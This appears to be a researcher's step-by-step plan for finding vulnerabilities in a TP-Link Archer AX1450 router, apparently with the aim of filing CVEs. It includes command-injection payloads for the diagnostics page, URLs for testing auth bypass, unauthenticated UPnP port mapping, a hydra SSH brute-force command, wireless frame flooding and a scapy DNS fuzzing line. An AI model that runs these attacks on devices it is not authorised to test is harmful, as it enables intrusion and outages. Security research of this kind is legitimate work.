# AX1450 Attack Plan
# Target: 192.168.0.1 — TP-Link Archer AX1450 Ver 2.6


## PRIORITY ORDER
1. Caido — capture diagnostics page requests
2. Test stok auth bypass manually
3. UPnP enumeration
4. Run frame_flood.py in background
5. SSH bigger wordlist
6. DNS fuzzing last


---


## 1. CAIDO — WEB INTERFACE (PORT 80/443)

Go through every page and interact with every input field.
Must capture pages:
- Diagnostics/Tools — ping, traceroute, nslookup (MOST IMPORTANT)
- Firmware update page
- System/Admin — passwords, backup, restore
- Wireless settings — SSID name, channel fields
- Parental controls — URL filtering, device name fields
- Dynamic DNS — hostname fields
- VPN settings if present
- USB/Storage if present

Fill in fields with random input and hit submit on each one.
Save Caido captures to scans/ folder and push to GitHub.

Test command injection on diagnostics endpoint:
```
; id
$(id)
| id
`id`
127.0.0.1; id
127.0.0.1 && id
127.0.0.1 | id
```

Test auth bypass — hit endpoints WITHOUT the stok token:
```
http://192.168.0.1/cgi-bin/luci/admin/status?form=internet
http://192.168.0.1/cgi-bin/luci/admin/smart_network?form=game_accelerator
```
If it returns data instead of 403 = auth bypass CVE.


---


## 2. UPNP (PORT 1900)

Install miniupnpc first:
```
sudo pacman -S miniupnpc
```

Enumerate exposed SOAP actions:
```
upnpc -s -u http://192.168.0.1:1900
```

Try adding a port mapping unauthenticated:
```
upnpc -a <your_ip> 4444 4444 TCP
```

If AddPortMapping works without auth = firewall bypass CVE.

Send malformed SOAP requests — oversized fields, wrong types, missing fields.


---


## 3. SSH (PORT 20001)

Bigger wordlist with hydra:
```
sudo pacman -S hydra seclists

hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
      -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
      ssh://192.168.0.1:20001
```

Or add more passwords to ssh_brute.py and run that.


---


## 4. WIRELESS FRAME FUZZING (BACKGROUND)

Run this the whole time on fuzzer laptop:
```
sudo python3 python/frame_flood.py
```

Run pinger on second laptop:
```
python3 python/pinger.py
```

If pinger shows router offline during fuzzing = crash = document immediately.
Note exact time, check which frame type was being sent at that moment.


---


## 5. DNS FUZZING (PORT 53)

Send malformed DNS queries via scapy:
```python
from scapy.all import *
send(IP(dst='192.168.0.1')/UDP(dport=53)/DNS(qd=DNSQR(qname='A'*255+'.com')))
```

Look for dnsmasq crashing or router becoming unresponsive.


---


## WHAT TO DOCUMENT WHEN YOU FIND SOMETHING

1. Exact request that triggered it (save from Caido)
2. Exact response
3. Screenshot everything
4. Confirm it works 3 times minimum
5. Note firmware version (Ver 2.6)
6. Write PoC script immediately
7. Push everything to GitHub
8. File within one week of finding
